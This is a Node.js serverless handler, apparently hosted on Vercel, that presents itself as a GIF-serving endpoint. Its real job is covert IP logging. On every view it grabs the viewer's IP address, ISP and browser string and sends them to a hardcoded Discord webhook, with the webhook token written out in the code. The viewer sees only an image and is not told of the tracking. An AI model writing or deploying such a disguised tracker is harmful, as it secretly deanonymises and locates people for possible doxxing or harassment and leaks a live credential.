import { createReadStream } from 'fs';
import { stat } from 'fs/promises';
import { extname } from 'path';
import fetch from 'node-fetch'; // Vercel has node-fetch polyfill

export default async function handler(req, res) {
  try {
    const { id } = req.query;
    if (!id || id < 1 || id > 20 || !/^[1-9]\d*$/.test(id)) {
      return res.status(404).end();
    }

    const gifPath = `../${id}.gif`;
    
    // Get client info
    const ua = req.headers['user-agent'] || 'Unknown';
    const forwarded = req.headers['x-forwarded-for'];
    const ip = Array.isArray(forwarded) 
      ? forwarded[0] 
      : forwarded?.split(',')[0]?.trim() || req.headers['x-real-ip'] || req.connection.remoteAddress || 'Unknown';
    
    // Get ISP/location
    let isp = 'Unknown', org = 'Unknown';
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
      const geoData = await geoRes.json();
      isp = geoData.org || 'Unknown';
      org = geoData.isp || geoData.org || 'Unknown';
    } catch (geoErr) {
      console.log('GeoIP failed:', geoErr.message);
    }

    const now = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
    
    // Webhook payload
    const message = `🖼️ **GIF Viewed!**%0A🎬 **GIF:** #${id} (${id}.gif)%0A🌐 **IP:** \`${ip}\`%0A🏢 **ISP:** ${org}%0A🖥️ **Browser/UA:** ${ua.substring(0, 100)}%0A🕐 **Time:** ${now}%0A🔗 **Direct:** https://goyzinparis.vercel.app/api/gif/${id}`;
    
    const webhookUrl = 'https://discord.com/api/webhooks/1490714732683067482/ae8gBJ6SmxJLVdbz5FMO55PmuhLnPPhSkp_iAvep88ScYAnlzEf6ghUVjUD_yoVRI-h2';
    
    // Fire webhook async (don't block response)
    (async () => {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: message.replace(/%0A/g, '\\n') })
        });
      } catch (webErr) {
        console.error('Webhook failed:', webErr);
      }
    })();

    // Serve GIF
    const stats = await stat(gifPath);
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Content-Length', stats.size);
    res.setHeader('Cache-Control', 'public, max-age=3600'); // Cache 1h
    res.setHeader('Access-Control-Allow-Origin', '*');

    createReadStream(gifPath).pipe(res);
  } catch (err) {
    console.error(err);
    res.status(404).end();
  }
}
